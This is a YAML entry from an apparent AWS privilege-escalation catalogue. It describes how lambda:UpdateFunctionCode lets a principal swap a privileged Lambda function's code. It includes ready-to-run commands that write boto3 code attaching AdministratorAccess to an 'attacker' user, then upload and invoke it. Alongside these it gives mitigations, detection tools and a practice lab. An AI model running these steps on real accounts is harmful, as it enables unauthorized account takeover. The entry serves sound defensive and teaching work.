id: lambda-003
name: lambda:UpdateFunctionCode
category: access-resource
services:
- lambda
description: A principal with `lambda:UpdateFunctionCode` can modify the code of an existing Lambda function that has a privileged
  execution role. By replacing the function code with malicious code, the attacker can execute arbitrary commands with the
  privileges of the function's execution role when the function is invoked. This is particularly effective against functions
  that are automatically triggered by events or regularly invoked.
prerequisites:
  admin:
  - A Lambda function must exist with an administrative execution role (e.g., AdministratorAccess)
  - The function must be invokable either manually or via automatic triggers
  lateral:
  - A Lambda function must exist with a privileged execution role
  - The function must be invokable either manually or via automatic triggers
exploitationSteps:
  awscli:
  - step: 1
    command: |
      echo 'import boto3; iam = boto3.client("iam"); iam.attach_user_policy(UserName="attacker", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")' > lambda_function.py
    description: Create malicious Lambda function code that escalates privileges
  - step: 2
    command: zip exploit.zip lambda_function.py
    description: Package the malicious code into a deployment package
  - step: 3
    command: |
      aws lambda update-function-code --function-name TARGET_FUNCTION \
        --zip-file fileb://exploit.zip
    description: Update the target Lambda function with the malicious code
  - step: 4
    command: aws lambda invoke --function-name TARGET_FUNCTION output.txt
    description: Invoke the function to execute the privilege escalation
recommendation: |
  Restrict the `lambda:UpdateFunctionCode` permission using the principle of least privilege.
  Use resource-based policies to limit which functions can be modified:

  ```json
  {
    "Effect": "Allow",
    "Action": "lambda:UpdateFunctionCode",
    "Resource": "arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction"
  }
  ```

  Additional controls:
  - Monitor CloudTrail for `UpdateFunctionCode` events on sensitive functions
  - Implement Lambda function versioning and aliases to prevent direct modification
  - Use AWS Config rules to detect changes to Lambda function code
  - Require code signing for Lambda deployments
  - Alert on Lambda functions with privileged roles being modified
discoveredBy:
  name: Spencer Gietzen
  organization: Rhino Security Labs
  date: '2019'
references:
- title: AWS Privilege Escalation Methods and Mitigation
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- title: IAM Vulnerable - Lambda Update Function Code
  url: https://github.com/BishopFox/iam-vulnerable
relatedPaths:
- lambda-001
- lambda-002
detectionTools:
  pmapper: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/lambda_edges.py#L152-L172
  cloudsplaining: https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L155
  pacu: https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L573-L577
  prowler: https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L94
learningEnvironments:
  iam-vulnerable:
    type: open-source
    githubLink: https://github.com/BishopFox/iam-vulnerable
    scenario: Lambda-EditExistingLambdaFunctionWithRole
    description: "Deploy Terraform into your own AWS account and practice individual exploitation paths"
permissions:
  required:
  - permission: lambda:UpdateFunctionCode
    resourceConstraints: Must have permission to update the target Lambda function's code
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: |
      The starting principal (user or role) with `lambda:UpdateFunctionCode` permission. This principal will modify the code of an existing Lambda function that has a privileged execution role, replacing it with malicious code to gain elevated privileges.
  - id: lambda_function
    label: Existing Lambda Function
    type: resource
    description: |
      An existing Lambda function with a privileged IAM execution role. This function must be invokable either manually (if the attacker has `lambda:InvokeFunction` permission) or automatically via event triggers (EventBridge, S3, DynamoDB streams, etc.). The function's execution role determines the level of access the attacker will gain.
  - id: exfiltrate
    label: Exfiltrate credentials
    type: action
    color: '#99ccff'
    description: |
      When the modified Lambda function is invoked, the malicious code executes with the function's execution role permissions. The malicious code can retrieve temporary credentials via the AWS SDK or perform privileged API calls directly. Common actions include attaching administrator policies to the starting principal, creating new access keys, or modifying IAM policies.
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: |
      If the target Lambda function's execution role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account by executing the malicious code. The code can directly modify IAM to grant the starting principal admin access or return admin credentials.
  - id: partial_outcome
    label: Check for Additional Access
    type: outcome
    color: '#ffeb99'
    description: |
      If the Lambda function's execution role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This could include access to sensitive data stores (S3, RDS, DynamoDB), the ability to modify other resources, or permissions that enable additional privilege escalation paths.
  - id: minimal_outcome
    label: No Additional Access
    type: outcome
    color: '#cccccc'
    description: |
      If the Lambda function's execution role only has minimal permissions (e.g., just CloudWatch Logs access), the privilege escalation may not yield meaningful additional access. However, the attacker still gains code execution capability which could be useful for reconnaissance or as part of a multi-step attack.
  edges:
  - from: start
    to: lambda_function
    label: lambda:UpdateFunctionCode
    description: |
      The attacker updates the target Lambda function's code with malicious code. This requires creating a deployment package (ZIP file) containing the malicious code and uploading it to replace the function's existing code.

      Commands:
      ```bash
      echo 'import boto3; iam = boto3.client("iam"); iam.attach_user_policy(UserName="attacker", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")' > lambda_function.py
      zip exploit.zip lambda_function.py
      aws lambda update-function-code \
        --function-name TARGET_FUNCTION \
        --zip-file fileb://exploit.zip
      ```

      The malicious code is now deployed and will execute with the function's execution role permissions when invoked.
  - from: lambda_function
    to: exfiltrate
    label: lambda:InvokeFunction or automatic trigger
    description: |
      The Lambda function is invoked, either manually by the attacker or automatically via an event trigger. When invoked, the malicious code executes with the privileges of the function's execution role.

      Manual invocation command:
      ```bash
      aws lambda invoke \
        --function-name TARGET_FUNCTION \
        output.txt
      ```

      Alternatively, if the function has automatic triggers (EventBridge rules, S3 events, DynamoDB streams, etc.), the attacker can wait for or force a trigger event to execute the malicious code.
  - from: exfiltrate
    to: admin_outcome
    label: If role has admin permissions
    branch: A
    condition: admin
    description: |
      If the Lambda function's execution role has AdministratorAccess or equivalent administrative permissions, the malicious code can grant the starting principal full administrative access. Common techniques include attaching the AdministratorAccess policy to the starting user/role, creating new admin access keys, or modifying existing policies.
  - from: exfiltrate
    to: partial_outcome
    label: If role has some permissions
    branch: B
    condition: some_permissions
    description: |
      If the Lambda function's execution role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. The malicious code should be tailored to the available permissions - for example, exfiltrating data from S3/RDS if data access permissions exist, or pursuing additional privilege escalation paths if IAM read permissions are available.
  - from: exfiltrate
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C
    condition: no_permissions
    description: |
      If the Lambda function's execution role only has minimal permissions (typically just `logs:CreateLogGroup`, `logs:CreateLogStream`, and `logs:PutLogEvents` for CloudWatch), the privilege escalation may not provide meaningful additional access. However, code execution capability could still be useful for reconnaissance or persistence.
